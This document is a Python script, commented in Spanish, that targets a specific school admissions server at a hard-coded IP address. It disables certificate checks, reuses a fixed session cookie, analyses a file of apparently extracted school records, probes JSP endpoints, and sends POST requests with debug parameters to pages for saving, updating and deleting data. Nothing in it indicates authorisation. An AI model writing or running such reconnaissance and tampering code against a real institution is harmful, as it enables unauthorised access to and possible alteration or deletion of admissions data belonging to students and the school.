# database_analysis.py
import json
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DatabaseAnalysis:
    def __init__(self):
        self.base_url = "https://189.254.143.102"
        self.session = requests.Session()
        self.session.verify = False
        self.session.cookies.set('JSESSIONID', '3B0DDD39CD0068BB30ED28B8C75B2A38')
        
    def analyze_extracted_data(self):
        """Analiza los datos extraídos de bachilleratos"""
        print("=== ANÁLISIS DE DATOS EXTRAÍDOS ===")
        
        try:
            with open('bachilleratos_extracted.json', 'r', encoding='utf-8') as f:
                bachilleratos = json.load(f)
            
            print(f"📊 Total de bachilleratos extraídos: {len(bachilleratos)}")
            
            # Análisis de los datos
            ids = [int(b['id']) for b in bachilleratos if b['id'].isdigit()]
            if ids:
                print(f"🔢 Rango de IDs: {min(ids)} - {max(ids)}")
            
            # Buscar patrones en los nombres
            patterns = {
                'TECNOLOGICO': len([b for b in bachilleratos if 'TECNOLOGICO' in b['nombre']]),
                'INDUSTRIAL': len([b for b in bachilleratos if 'INDUSTRIAL' in b['nombre']]),
                'AGROPECUARIO': len([b for b in bachilleratos if 'AGROPECUARIO' in b['nombre']]),
                'COLEGIO': len([b for b in bachilleratos if 'COLEGIO' in b['nombre']]),
                'EMSAD': len([b for b in bachilleratos if 'EMSAD' in b['nombre']]),
            }
            
            print("\n📈 Estadísticas de tipos:")
            for pattern, count in patterns.items():
                if count > 0:
                    print(f"  {pattern}: {count}")
            
            # Mostrar algunos ejemplos interesantes
            print("\n🎯 Ejemplos interesantes:")
            for bachillerato in bachilleratos[:5]:
                print(f"  {bachillerato['id']}: {bachillerato['nombre'][:50]}...")
                
        except FileNotFoundError:
            print("❌ Archivo bachilleratos_extracted.json no encontrado")
    
    def find_related_tables(self):
        """Intenta encontrar tablas relacionadas en la base de datos"""
        print("\n[+] Buscando tablas relacionadas...")
        
        # Basado en los datos de bachilleratos, buscar tablas relacionadas
        endpoints_to_try = [
            "/jsp/escolar/proceso_admision/muestra_especialidades_ajax.jsp",
            "/jsp/escolar/proceso_admision/muestra_municipios_ajax.jsp",
            "/jsp/escolar/proceso_admision/muestra_estados_ajax.jsp",
            "/jsp/escolar/proceso_admision/muestra_carreras_ajax.jsp",
            "/jsp/escolar/proceso_admision/muestra_tipos_ajax.jsp"
        ]
        
        for endpoint in endpoints_to_try:
            url = f"{self.base_url}{endpoint}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"✅ Endpoint encontrado: {endpoint}")
                    print(f"   Respuesta: {response.text[:100]}...")
            except:
                pass
    
    def test_database_operations(self):
        """Prueba operaciones de base de datos mediante la aplicación"""
        print("\n[+] Probando operaciones de BD...")
        
        # URLs que podrían ejecutar operaciones de BD
        db_operations = [
            "/jsp/escolar/proceso_admision/guardar_datos.jsp",
            "/jsp/escolar/proceso_admision/actualizar_datos.jsp",
            "/jsp/escolar/proceso_admision/consultar_datos.jsp",
            "/jsp/escolar/proceso_admision/eliminar_datos.jsp"
        ]
        
        for operation in db_operations:
            url = f"{self.base_url}{operation}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"✅ Operación encontrada: {operation}")
                    
                    # Probar con parámetros básicos
                    test_params = {"id": "1", "test": "true", "debug": "1"}
                    response_post = self.session.post(url, data=test_params)
                    print(f"   POST response: {response_post.status_code}")
                    
            except:
                pass

# Ejecutar
if __name__ == "__main__":
    analyzer = DatabaseAnalysis()
    analyzer.analyze_extracted_data()
    analyzer.find_related_tables()
    analyzer.test_database_operations()